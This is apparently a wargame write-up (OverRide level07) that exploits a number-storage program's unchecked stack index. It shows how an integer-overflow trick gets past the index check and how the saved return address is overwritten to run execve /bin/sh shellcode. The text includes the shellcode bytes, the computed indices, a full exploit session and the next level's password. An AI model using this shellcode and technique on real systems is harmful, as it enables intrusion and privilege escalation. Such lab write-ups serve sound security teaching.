## The program

The program allows the user to store numbers in a table, at a chosen index, to retrieve numbers stored in the table at a chosen index, or to quit.

- The `read` instruction calls a `read_number` function which retrieves an unsigned int stored at a specify index.
- The `store` instruction calls a `store_number` function. which asks for a number and an index. If the index is divisible by 3, the function returns with an error message that the3 index is not available. Otherwise, it stores the number provided at the requested index.
- the `quit` instruction just quits the program

It is important to mention that the program protects for any arguments provided to the program, or any environment variable that could compromise its security : in the main(), it does erase arguments and environment variable, in case a smart boy had introduced malicious code through these means...


## The vulnerability

The vulnerability comes from the fact that there is no check performed on the index + the unsigned int table is stored on the stack : This makes the possibility to store and/or read in stack memory wherever we want.


## The exploit

The exploit will consist in storing a shellcode in the table (so 4 by 4 bytes => unsigned int), and erase the address stored in memory at `$ebp+0x4` (so next instruction $eip of function `_libc_start_main` which launches the main) with the address of our table. The program will then call our shellcode when returning from main().

1. First step : Getting the suite of unsigned integers which correspond to the shellcode. As we'll have to enter the number one by one at the right index, it is better to take a [tiny shellcode](http://shell-storm.org/shellcode/files/shellcode-841.php).

    The shellcode is `\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80` and is **21 bytes long**

    We have to take 4 by 4 bytes together, reverse them for taking little endian into account, and get the unsigned int equivalent. This makes 5 unsigned int that have to be stored at indices 0, 1, 2, 3, 4, 5. cf the ptyhon3 script to get the list of numbers.

2. Second step : Getting the right indices.

    As we said we need to store the numbers at indices `0 to 5 included`. The problem is that the `store_number` function does not allow us to store a number at an index which is divisible by 3. So in our case, 0 and 3 won't work.

    We can see in the asembly code of `store_number`, that the index is multiplied by 4 (left shift of 2 at Line <+149>) after the divisibility check, and before the number is retrieved. This is normal as we have an unsigned int table, so when we ask for the index 2 for exemple, the program goes get the number represented by the 4 bytes starting `4 x 2 = 8 bytes` after the beginning of our table. This is the classic functioning of a table storing elements of type greater than 1 byte.

    We could exploit that : we can give a sufficiently large number, not divisible by 3, and when multiplied by 4 it would overflow UINT_MAX (`2^32 - 1 or 4,294,967,295) and give the number where we want to read in memory (so after multiplying by 4 obviously).

    Hence for 0 we want that our index multiplied by 4 gives 2^32 : `index = 2^32 / 4 = 1073741824`

    For index 3, we want that our index multiplied by 4 gives 12 : `index = (2^32 + 12) / 4 = 1073741827`

3. Getting the value to be stored at pre-main $eip

    As we haven't included NOP instructions, for we want the shellcode to be as small as possible to avoid writing many numbers, it's better if we store directly the right address of our table (hence the beginning of our shellcode)

    We know, from `main Line <+448>`, that our table is sotred at `$esp+0x24`. Using the command `i r $esp` in the main(), we find the value of $esp : `0xffffd4e0` so our table starts at address `0xffffd4e0 + 0x24 = 0xffffd504`. But this is its value inside gdb environment, which differs slightly from the "real" envionment outside of gdb. So if we put this address it wont work. We can try several addresses greater than this number, but it would require lots of trial and errors, and entering the shellcode numbers is already time-consuming when done once.

    The trick : we notice we can read negative indices as well. When calling `read_number` (Line <+520>), the address of the table is stored at $esp of main. Then, $eip and $ebp are pushed onto the stack, so this argument is stored at `$ebp+0x8` in the `read_number` function. Notice that this is above the address of our tab. We can set a breakpoint in `read_number`, and once reach, get teh address at `$ebp+0x8` witht he command `x/wx $ebp+0x8` => `0xffffd4e0`.

    So the address of our table is stored `0xffffd504 - 0xffffd4e0 = 0x24 = 36 bytes` above our table. `36 / 4 = 9` so at index `-9`

4. Getting the index at which the next instruction of the pre-main function is stored.
    
    Let's put a breakpoint in main, and get the address of $ebp : `i r $ebp` and add 4 to get to the location where $eip of previous function is stored : this is what we want to replace. We get `0xffffd6c8 + 4 = 0xffffd6cc`. We find the offset (difference betwwen our table and this memory location) : `0x1c8 or 456 bytes`

    `456 / 4 = 114` which means we have to store the value found previously at index 114.

    The problem is that 114 is divisible by, so, with the same technique we used in point 2 above, we have to enter the index : `(2^32 + 114 * 4) / 4 = 1073741938`

    This will erase the value of the next instruction of the `_libc_start_main` function


## Result

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 3791112497
 Index: 1073741824
 Completed store command successfully
Input command: store
 Number: 1750141872
 Index: 1
 Completed store command successfully
Input command: store
 Number: 1752379183
 Index: 2
 Completed store command successfully
Input command: store
 Number: 1768042344
 Index: 1073741827
 Completed store command successfully
Input command: store
 Number: 3454241134
 Index: 4
 Completed store command successfully
Input command: store
 Number: 128
 Index: 5
 Completed store command successfully
Input command: read
 Index: -9
 Number at data[4294967287] is 4294956340                #address of the unsigned int table
 Completed read command successfully
Input command: store
 Number: 4294956340                                      #which gets stored at $eip pre-main
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$
```